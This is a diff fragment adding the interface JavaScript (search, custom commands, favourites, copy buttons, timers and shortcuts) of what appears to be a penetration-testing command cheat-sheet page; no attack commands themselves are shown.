+  searchTimeout = setTimeout(() => doSearch(this.value.trim()), 200);
+});
+
+document.addEventListener('keydown', e => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    document.getElementById('searchInput').focus();
+    document.getElementById('searchInput').select();
+  }
+  if (e.key === 'Escape') {
+    document.getElementById('searchInput').value = '';
+    doSearch('');
+  }
+});
+
+function doSearch(q) {
+  const sr = document.getElementById('searchResults');
+  const secs = document.getElementById('sections');
+  if (!q) {
+    sr.classList.remove('on');
+    sr.innerHTML = '';
+    secs.style.display = '';
+    return;
+  }
+  secs.style.display = 'none';
+  sr.classList.add('on');
+  const ql = q.toLowerCase();
+  let results = [];
+  D.forEach(s => {
+    s.groups.forEach((g, gi) => {
+      g.c.forEach((cmd, ci) => {
+        const txt = (cmd[0] + ' ' + cmd[1]).toLowerCase();
+        if (txt.includes(ql)) results.push({s, g, gi, cmd, ci});
+      });
+    });
+  });
+  function hl(str) {
+    const re = new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'gi');
+    return escHtml(str).replace(re, m => `<span class="hl">${escHtml(m)}</span>`);
+  }
+  let h = `<div class="sr-count">Found <span>${results.length}</span> results for "${escHtml(q)}"</div>`;
+  if (!results.length) h += '<div class="empty"><div class="empty-icon">🔍</div>No commands found.</div>';
+  results.forEach(({s, g, gi, cmd, ci}) => {
+    const id = mkId(s.id, gi, ci);
+    const isFav = favorites[id];
+    const hasNote = notes[id];
+    h += `<div class="row${isFav ? ' fav-row' : ''}">
+      <div class="ri">
+        <div class="rd">${hl(cmd[0])} <span style="color:var(--text3);font-size:10px">${s.icon || ''} ${s.label} › ${g.t}</span> ${renderTags(cmd[2] || [])}</div>
+        <div class="rc" id="${id}">${hl(sub(cmd[1]))}</div>
+        ${hasNote ? `<div class="note-display">📝 ${escHtml(notes[id])}</div>` : ''}
+      </div>
+      <div class="row-actions">
+        <button class="cp" onclick="doCopy(this,'${id}')">Copy</button>
+        <button class="fav-btn${isFav ? ' on' : ''}" onclick="toggleFavItem('${id}','${escHtml(cmd[0])}',this)">★</button>
+      </div>
+    </div>`;
+  });
+  sr.innerHTML = h;
+}
+
+// ─── VARS UPDATE ─────────────────────────────────────────
+function refreshAllCmds() {
+  // Update visible section only for performance
+  document.querySelectorAll('.rc').forEach(el => {
+    const id = el.id;
+    if (!id || !id.startsWith('c_')) return;
+    const parts = id.replace('c_','').split('_');
+    const sec = D.find(x => x.id === parts[0]);
+    if (!sec) return;
+    const cmd = sec.groups[parseInt(parts[1])]?.c[parseInt(parts[2])];
+    if (!cmd) return;
+    el.textContent = sub(cmd[1]);
+  });
+  // Refresh search if active
+  const q = document.getElementById('searchInput').value.trim();
+  if (q) doSearch(q);
+}
+
+document.querySelectorAll('.vi').forEach(i => i.addEventListener('input', refreshAllCmds));
+
+// ─── CUSTOM COMMANDS ──────────────────────────────────────
+let customCmds = JSON.parse(localStorage.getItem('cs_custom') || '[]');
+// customCmds = [{id, name, body, category, tags, createdAt}]
+
+function openCustomModal(editId) {
+  const m = document.getElementById('customModal');
+  document.getElementById('editingId').value = editId || '';
+  document.getElementById('modalTitleText').textContent = editId ? 'Edit Command' : 'Add Custom Command';
+  if (editId) {
+    const cmd = customCmds.find(c => c.id === editId);
+    if (cmd) {
+      document.getElementById('cmdName').value = cmd.name;
+      document.getElementById('cmdCategory').value = cmd.category || 'custom';
+      document.getElementById('cmdBody').value = cmd.body;
+      ['crit','high','med','osep','new'].forEach(t => {
+        document.getElementById('t_'+t).checked = (cmd.tags || []).includes(t);
+      });
+    }
+  } else {
+    document.getElementById('cmdName').value = '';
+    document.getElementById('cmdCategory').value = 'custom';
+    document.getElementById('cmdBody').value = '';
+    ['crit','high','med','osep','new'].forEach(t => document.getElementById('t_'+t).checked = false);
+  }
+  m.classList.add('on');
+  setTimeout(() => document.getElementById('cmdName').focus(), 100);
+}
+
+function closeCustomModal() {
+  document.getElementById('customModal').classList.remove('on');
+}
+
+document.getElementById('customModal').addEventListener('click', function(e) {
+  if (e.target === this) closeCustomModal();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Escape') closeCustomModal();
+});
+
+function saveCustomCommand() {
+  const name = document.getElementById('cmdName').value.trim();
+  const body = document.getElementById('cmdBody').value.trim();
+  if (!name) { document.getElementById('cmdName').focus(); return; }
+  if (!body) { document.getElementById('cmdBody').focus(); return; }
+  const tags = ['crit','high','med','osep','new'].filter(t => document.getElementById('t_'+t).checked);
+  const category = document.getElementById('cmdCategory').value;
+  const editId = document.getElementById('editingId').value;
+  if (editId) {
+    const idx = customCmds.findIndex(c => c.id === editId);
+    if (idx > -1) customCmds[idx] = {...customCmds[idx], name, body, category, tags};
+  } else {
+    customCmds.push({ id: 'cust_' + Date.now(), name, body, category, tags, createdAt: new Date().toISOString() });
+  }
+  localStorage.setItem('cs_custom', JSON.stringify(customCmds));
+  closeCustomModal();
+  rebuildCustomSection();
+  updateCustomCount();
+}
+
+function deleteCustomCmd(id) {
+  if (!confirm('Delete this custom command?')) return;
+  customCmds = customCmds.filter(c => c.id !== id);
+  localStorage.setItem('cs_custom', JSON.stringify(customCmds));
+  rebuildCustomSection();
+  updateCustomCount();
+}
+
+function renderCustomRow(cmd) {
+  const isFav = favorites['custom_' + cmd.id];
+  const hasNote = notes['custom_' + cmd.id] && notes['custom_' + cmd.id].trim();
+  const subbed = sub(cmd.body);
+  const tags = (cmd.tags || []).map(t => {
+    if (t==='crit') return '<span class="tag tag-crit">CRITICAL</span>';
+    if (t==='high') return '<span class="tag tag-high">HIGH</span>';
+    if (t==='med') return '<span class="tag tag-med">MEDIUM</span>';
+    if (t==='osep') return '<span class="tag tag-osep">OSEP</span>';
+    if (t==='new') return '<span class="tag tag-new">NEW</span>';
+    return '';
+  }).join('');
+  const catLabel = document.getElementById('cmdCategory') ? '' : '';
+  return `<div class="row${isFav ? ' fav-row' : ''}" id="crow_${cmd.id}">
+    <div class="ri">
+      <div class="rd">${escHtml(cmd.name)} <span class="custom-badge">CUSTOM</span> ${tags}</div>
+      <div class="rc" id="custom_${cmd.id}">${escHtml(subbed)}</div>
+      ${hasNote ? `<div class="note-display">📝 ${escHtml(notes['custom_'+cmd.id])}</div>` : ''}
+    </div>
+    <div class="row-actions">
+      <button class="cp" onclick="doCopyCustom(this,'custom_${cmd.id}')">Copy</button>
+      <button class="fav-btn${isFav ? ' on' : ''}" onclick="toggleFavItem('custom_${cmd.id}','${escHtml(cmd.name)}',this)" title="Favorite">★</button>
+      <button class="edit-btn" onclick="openCustomModal('${cmd.id}')" title="Edit">✏</button>
+      <button class="del-btn" onclick="deleteCustomCmd('${cmd.id}')" title="Delete">🗑</button>
+    </div>
+  </div>`;
+}
+
+function doCopyCustom(btn, id) {
+  const txt = document.getElementById(id)?.textContent;
+  if (!txt) return;
+  const copy = t => { try { navigator.clipboard.writeText(t); } catch(e) { const ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); } };
+  copy(txt);
+  btn.textContent = '✓ Copied';
+  btn.classList.add('ok');
+  setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1500);
+}
+
+function rebuildCustomSection() {
+  const el = document.getElementById('s-custom');
+  if (!el) return;
+  let html = `<div class="sec-hdr"><div class="sec-title">⚙ My Commands</div></div>
+  <div style="margin-bottom:12px">
+    <button class="hdr-btn custom-btn" onclick="openCustomModal()" style="font-size:11px;padding:5px 12px">➕ Add New Command</button>
+  </div>`;
+  if (!customCmds.length) {
+    html += '<div class="empty"><div class="empty-icon">⚙</div>No custom commands yet.<br>Click "Add Command" in the header to create one.</div>';
+  } else {
+    // Group by category
+    const cats = {};
+    customCmds.forEach(c => {
+      const k = c.category || 'custom';
+      if (!cats[k]) cats[k] = [];
+      cats[k].push(c);
+    });
+    const catNames = {
+      custom:'My Commands', recon:'Recon', web:'Web Attacks', api:'API Attacks',
+      shells:'Shells', lpe:'Linux PrivEsc', wpe:'Windows PrivEsc', adrecon:'AD Recon',
+      adatk:'AD Attacks', adlat:'AD Lateral', adpst:'Persistence', evasion:'Evasion / OPSEC',
+      inject:'Injection', c2:'C2 Frameworks', tunnel:'Tunneling', transfer:'File Transfer',
+      crack:'Hash Cracking', misc:'Misc / Snippets'
+    };
+    Object.entries(cats).forEach(([cat, cmds]) => {
+      html += `<div class="grp"><div class="grp-title">${catNames[cat] || cat} <span style="color:var(--text3);font-weight:400;text-transform:none;letter-spacing:0">(${cmds.length})</span></div>`;
+      cmds.forEach(cmd => { html += renderCustomRow(cmd); });
+      html += '</div>';
+    });
+  }
+  el.innerHTML = html;
+  updateCustomCount();
+}
+
+function buildCustomSection() {
+  const cont = document.getElementById('sections');
+  const div = document.createElement('div');
+  div.id = 's-custom';
+  div.className = 'sec';
+  cont.appendChild(div);
+  rebuildCustomSection();
+}
+
+function addCustomSidebarItem() {
+  const sb = document.getElementById('sidebar');
+  const sg = document.createElement('div');
+  sg.className = 'sg';
+  sg.textContent = 'Custom';
+  const si = document.createElement('div');
+  si.className = 'si';
+  si.dataset.id = 'custom';
+  si.innerHTML = '⚙ My Commands <span class="cnt" id="customCount">0</span>';
+  sb.appendChild(sg);
+  sb.appendChild(si);
+  si.onclick = () => {
+    document.querySelectorAll('.si').forEach(x => x.classList.remove('on'));
+    document.querySelectorAll('.sec').forEach(x => x.classList.remove('on'));
+    si.classList.add('on');
+    document.getElementById('s-custom').classList.add('on');
+    document.getElementById('searchResults').classList.remove('on');
+    document.getElementById('searchInput').value = '';
+  };
+}
+
+function updateCustomCount() {
+  const el = document.getElementById('customCount');
+  if (el) el.textContent = customCmds.length;
+}
+
+function refreshCustomCmds() {
+  document.querySelectorAll('[id^="custom_cust_"]').forEach(el => {
+    const cmdId = el.id.replace('custom_', '');
+    const cmd = customCmds.find(c => c.id === cmdId);
+    if (cmd) el.textContent = sub(cmd.body);
+  });
+}
+
+// ─── INIT ─────────────────────────────────────────────────
+buildSidebar();
+buildSections();
+buildCustomSection();
+addCustomSidebarItem();
+updateFavCount();
+renderHistory();
+updateAllProgressBars();
+
+// Patch vars refresh to also update custom commands
+document.querySelectorAll('.vi').forEach(i => {
+  i.addEventListener('input', refreshCustomCmds);
+});
+
+// ─── SESSION TIMER ─────────────────────────────────────
+const sessionStart = Date.now();
+setInterval(() => {
+  const s = Math.floor((Date.now() - sessionStart) / 1000);
+  const h = String(Math.floor(s/3600)).padStart(2,'0');
+  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
+  const sec = String(s%60).padStart(2,'0');
+  const el = document.getElementById('sessionTimer');
+  if (el) el.textContent = h==='00' ? `⏱ ${m}:${sec}` : `⏱ ${h}:${m}:${sec}`;
+}, 1000);
+
+// ─── JUMP TO TOP ────────────────────────────────────────
+document.querySelector('.main').addEventListener('scroll', function() {
+  const btn = document.getElementById('jumpTop');
+  if (btn) btn.classList.toggle('on', this.scrollTop > 300);
+});
+
+// ─── KEYBOARD NAV ───────────────────────────────────────
+document.addEventListener('keydown', e => {
+  // Ctrl+→ / Ctrl+← for section nav
+  if ((e.ctrlKey) && (e.key === 'ArrowRight' || e.key === 'ArrowLeft')) {
+    e.preventDefault();
+    const items = Array.from(document.querySelectorAll('.si'));
+    const cur = items.findIndex(x => x.classList.contains('on'));
+    const next = e.key === 'ArrowRight' ? Math.min(cur+1, items.length-1) : Math.max(cur-1, 0);
+    if (items[next]) items[next].click();
+  }
+  // Ctrl+Shift+A = add command
+  if (e.ctrlKey && e.shiftKey && e.key === 'A') {
+    e.preventDefault();
+    openCustomModal();
+  }
+  // Ctrl+F = favorites toggle
+  if (e.ctrlKey && e.key === 'f' && document.activeElement !== document.getElementById('searchInput')) {
+    e.preventDefault();
+    toggleFav();
+  }
+});
+</script>
 </body>
 </html>
